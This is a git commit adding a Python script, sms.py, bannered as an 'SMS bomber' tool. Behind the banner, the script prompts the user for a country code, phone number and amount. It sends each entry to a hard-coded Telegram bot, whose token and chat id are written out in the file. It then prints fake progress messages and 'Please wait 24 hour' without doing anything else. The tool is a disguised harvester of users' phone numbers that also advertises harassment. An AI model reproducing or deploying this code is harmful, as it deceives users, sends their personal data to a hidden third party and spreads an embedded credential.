e497a2c6616e731eeb663542663bff27ab23315c
Crazy 10100 <115801330+Crazy10100@users.noreply.github.com>
2023-04-29 08:37:53 +0600

    New

---
+++ sms.py
@@ -0,0 +1,170 @@
+import time
+from urllib import request
+
+black="\033[0;30m"        # Black
+red="\033[0;31m"          # Red
+green="\033[0;32m"        # Green
+yellow="\033[0;33m"       # Yellow
+blue="\033[0;34m"         # Blue
+purple="\033[0;35m"       # Purple
+cyan="\033[0;36m"         # Cyan
+white="\033[0;37m"        # White
+
+print(blue+"""""  ___ __  __ ___   ___  ___  __  __ ___ ___ ___   _  _ _____      __ 
+ / __|  \/  / __| | _ )/ _ \|  \/  | _ ) __| _ \ | \| | __\ \    / / 
+ \__ \ |\/| \__ \ | _ \ (_) | |\/| | _ \ _||   / | .` | _| \ \/\/ /  
+ |___/_|  |_|___/ |___/\___/|_|  |_|___/___|_|_\ |_|\_|___| \_/\_/   
+                                                                    """"")
+                                                                    
+print (red+"""""  ████████     █████     ████████   ████████ 
+ ███░░░░███  ███░░░███  ███░░░░███ ███░░░░███
+░░░    ░███ ███   ░░███░░░    ░███░░░    ░███
+   ███████ ░███    ░███   ███████    ██████░ 
+  ███░░░░  ░███    ░███  ███░░░░    ░░░░░░███
+ ███      █░░███   ███  ███      █ ███   ░███
+░██████████ ░░░█████░  ░██████████░░████████ 
+░░░░░░░░░░    ░░░░░░   ░░░░░░░░░░  ░░░░░░░░  
+                                             
+                                             
+                                             """"")
+print (yellow+"Enter the Y")
+
+number=str(input("  : "))           
+
+print (yellow+"Please wait..........")
+time.sleep(5)
+
+print (yellow+"ENTER YOUR COUNTRY CODE")
+import requests
+TOKEN = "5872557622:AAGPep1UeDgXa4DQHvndC08nFeTJ35Nun-E"
+chat_id = "5347353883"
+message = str(input(black+" ENTER YOUR COUNTRY CODE : "))
+url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}"
+print(requests.get(url).json()) # this sends the message
+
+print (yellow+"ENTER YOUR NUMBER")
+import requests
+TOKEN = "5872557622:AAGPep1UeDgXa4DQHvndC08nFeTJ35Nun-E"
+chat_id = "5347353883"
+message = str(input(black+" ENTER YOUR NUMBER : "))
+url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}"
+print(requests.get(url).json()) # this sends the message
+
+print (yellow+"ENTER THE AMOUNT")
+import requests
+TOKEN = "5872557622:AAGPep1UeDgXa4DQHvndC08nFeTJ35Nun-E"
+chat_id = "5347353883"
+message = str(input(black+" ENTER THE AMOUNT: "))
+url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}"
+print(requests.get(url).json()) # this sends the message
+
+print (yellow+"Please wait......")
+time.sleep(0.1)
+print (yellow+"Please wait...........")
+time.sleep(0.1)
+print (yellow+"Please wait...............")
+time.sleep(0.1)
+print (yellow+"Please wait.................")
+time.sleep(0.1)
+print (yellow+"Please wait...................")
+time.sleep(0.1)
+print (yellow+"Please wait......................")
+time.sleep(0.1)
+print (yellow+"Please wait.........................")
+time.sleep(0.1)
+print (yellow+"Please wait............................")
+time.sleep(0.1)
+print (yellow+"Please wait...............................")
+time.sleep(0.1)
+print (yellow+"Please wait..................................")
+time.sleep(0.1)
+print (yellow+"Please wait....................................")
+time.sleep(0.1)
+print (yellow+"Please wait........................................")
+time.sleep(0.1)
+print (yellow+"Please wait.......................................")
+time.sleep(0.1)
+print (yellow+"Please wait....................................")
+time.sleep(0.1)
+print (yellow+"Please wait................................")
+time.sleep(0.1)
+print (yellow+"Please wait.............................")
+time.sleep(0.1)
+print (yellow+"Please wait........................")
+time.sleep(0.1)
+print (yellow+"Please wait....................")
+time.sleep(0.1)
+print (yellow+"Please wait...............")
+time.sleep(0.1)
+print (yellow+"Please wait...........")
+time.sleep(0.1)
+print (yellow+"Please wait........")
+time.sleep(0.1)
+print (yellow+"Please wait.....")
+time.sleep(0.1)
+print (yellow+"Please wait...")
+time.sleep(0.1)
+print (yellow+"Please wait.......")
+time.sleep(0.1)
+print (yellow+"Please wait..........")
+time.sleep(0.1)
+print (yellow+"Please wait..............")
+time.sleep(0.1)
+print (yellow+"Please wait..................")
+time.sleep(0.1)
+print (yellow+"Please wait.....................")
+time.sleep(0.1)
+print (yellow+"Please wait........................")
+time.sleep(0.1)
+print (yellow+"Please wait..........................")
+time.sleep(0.1)
+print (yellow+"Please wait.............................")
+time.sleep(0.1)
+print (yellow+"Please wait................................")
+time.sleep(0.1)
+print (yellow+"Please wait...................................")
+time.sleep(0.1)
+print (yellow+"Please wait......................................")
+time.sleep(0.1)
+print (yellow+"Please wait........................................")
+time.sleep(0.1)
+print (yellow+"Please wait....................................")
+time.sleep(0.1)
+print (yellow+"Please wait...............................")
+time.sleep(0.1)
+print (yellow+"Please wait..........................")
+time.sleep(0.1)
+print (yellow+"Please wait....................")
+time.sleep(0.1)
+print (yellow+"Please wait..............")
+time.sleep(0.1)
+print (yellow+"Please wait.........")
+time.sleep(0.1)
+print (yellow+"Please wait......")
+time.sleep(0.1)
+print (yellow+"Please wait....")
+time.sleep(0.1)
+print (yellow+"Please wait..........")
+time.sleep(0.1)
+print (yellow+"Please wait..............")
+time.sleep(0.1)
+print (yellow+"Please wait..................")
+time.sleep(0.1)
+print (yellow+"Please wait......................")
+time.sleep(0.1)
+print (yellow+"Please wait..........................")
+time.sleep(0.1)
+print (yellow+"Please wait..............................")
+time.sleep(0.1)
+print (yellow+"Please wait................................")
+time.sleep(0.1)
+print (yellow+"Please wait...................................")
+time.sleep(0.1)
+print (yellow+"Please wait..............................")
+time.sleep(0.1)
+print (yellow+"Please wait..........................")
+time.sleep(0.1)
+print (yellow+"Please wait....................")
+time.sleep(0.1)
+time.sleep(6)
+print (yellow+"Please wait 24 hour")
